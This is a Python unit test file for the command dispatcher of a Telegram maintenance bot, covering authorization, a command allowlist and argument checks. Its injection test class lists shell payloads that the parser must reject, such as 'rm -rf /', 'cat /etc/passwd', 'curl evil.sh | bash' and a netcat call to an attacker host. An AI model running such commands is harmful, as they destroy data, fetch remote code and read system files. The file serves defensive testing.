#!/usr/bin/env python3
"""Tests for Medic's dispatch core -- the injection-proof security linchpin.

Run: python3 scripts/test_medic_dispatch.py
"""
import os
import sys
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__))))

from medic import dispatch  # noqa: E402
from medic.dispatch import Command, Reject  # noqa: E402
from medic.types import ExecResult, HandlerContext, Reply  # noqa: E402


class AuthorizeTests(unittest.TestCase):
    def test_only_boss_chat_is_authorized(self):
        self.assertTrue(dispatch.authorize(dispatch.BOSS_CHAT_ID))
        self.assertTrue(dispatch.authorize(str(dispatch.BOSS_CHAT_ID)))  # Telegram may send str

    def test_everyone_else_rejected(self):
        for bad in (0, 123, -1, "999", None, "", "abc", 8643929443):
            self.assertFalse(dispatch.authorize(bad), bad)


class AllowlistTests(unittest.TestCase):
    def test_no_arg_commands_parse(self):
        for verb in ("status", "diagnose", "token-refresh", "login-link"):
            r = dispatch.parse(verb)
            self.assertIsInstance(r, Command, verb)
            self.assertEqual(r.name, verb)
            self.assertIsNone(r.arg)

    def test_leading_slash_and_botname_normalised(self):
        self.assertEqual(dispatch.parse("/status").name, "status")
        self.assertEqual(dispatch.parse("/status@Medic_fixer_bot").name, "status")
        self.assertEqual(dispatch.parse("STATUS").name, "status")  # case-insensitive

    def test_unknown_verb_rejected_with_usage(self):
        r = dispatch.parse("nuke")
        self.assertIsInstance(r, Reject)
        self.assertEqual(r.reason, "unknown")
        self.assertIn("status", r.message)  # usage listed

    def test_no_arg_command_rejects_extra_arg(self):
        r = dispatch.parse("status now")
        self.assertIsInstance(r, Reject)
        self.assertEqual(r.reason, "extra_arg")


class ArgValidationTests(unittest.TestCase):
    def test_agent_arg_must_be_known_agent(self):
        self.assertEqual(dispatch.parse("mcp dave").arg, "dave")
        self.assertEqual(dispatch.parse("restart-telegram thor").arg, "thor")
        for r in (dispatch.parse("mcp marveen"),       # orchestrator not an agent target
                  dispatch.parse("mcp nobody"),
                  dispatch.parse("restart-telegram all")):
            self.assertIsInstance(r, Reject)
            self.assertEqual(r.reason, "bad_arg")

    def test_restart_target_enum(self):
        for ok in ("dave", "genesis", "all", "claudia"):
            self.assertEqual(dispatch.parse(f"restart {ok}").arg, ok)
        self.assertEqual(dispatch.parse("restart bogus").reason, "bad_arg")

    def test_missing_required_arg(self):
        self.assertEqual(dispatch.parse("mcp").reason, "missing_arg")
        self.assertEqual(dispatch.parse("restart").reason, "missing_arg")


class InjectionTests(unittest.TestCase):
    """Every shell/path-injection payload must be rejected, never become a Command."""

    PAYLOADS = [
        "mcp dave; rm -rf /",
        "mcp dave && reboot",
        "restart all; cat /etc/passwd",
        "mcp $(whoami)",
        "mcp `id`",
        "restart ../../etc",
        "mcp dave\nrm -rf ~",
        "status; curl evil.sh | bash",
        "token-refresh ; echo pwned",
        "mcp dave|nc attacker 1",
        "restart-telegram dave' OR '1'='1",
    ]

    def test_injection_payloads_never_yield_executable_command(self):
        for p in self.PAYLOADS:
            r = dispatch.parse(p)
            # Either a hard Reject, or -- if it somehow parses -- the arg must be a
            # pristine enum member with no shell metacharacters.
            if isinstance(r, Command):
                self.assertIn(r.arg, dispatch.AGENT_SET | dispatch.RESTART_TARGET_SET, p)
                self.assertNotRegex(r.arg or "", r"[;&|`$()<>'\"\\/ ]")
            else:
                self.assertIsInstance(r, Reject, p)

    def test_empty_and_garbage(self):
        for t in ("", "   ", None, 42, "\n\t"):
            self.assertIsInstance(dispatch.parse(t), Reject, repr(t))


class FakeExecutor:
    """Minimal Executor that records calls; never touches the real system."""
    def __init__(self):
        self.calls = []

    def run(self, argv, timeout=30.0):
        self.calls.append(list(argv))
        return ExecResult(0, "", "")

    def read_text(self, path):
        return None

    def write_text(self, path, content, mode=0o600):
        return True

    def path_mtime(self, path):
        return None

    def query(self, sql, params=()):
        return []

    def now(self):
        return 1780916754.0


class RoutingSmokeTests(unittest.TestCase):
    """The registry wiring routes every allowlisted command to a Reply without
    raising (stubs return placeholder text on eng/medic-base)."""

    def setUp(self):
        from medic import bot
        self.bot = bot
        self.ex = FakeExecutor()

    def test_every_command_routes_to_a_reply(self):
        for text in ("status", "diagnose", "restart dave", "restart-telegram dave",
                     "mcp dave", "token-refresh", "login-link"):
            reply = self.bot.handle_update(text, self.ex)
            self.assertIsInstance(reply, Reply, text)
            self.assertTrue(reply.text)

    def test_reject_routes_to_usage_reply(self):
        reply = self.bot.handle_update("nope", self.ex)
        self.assertIn("status", reply.text)


if __name__ == "__main__":
    unittest.main(verbosity=2)
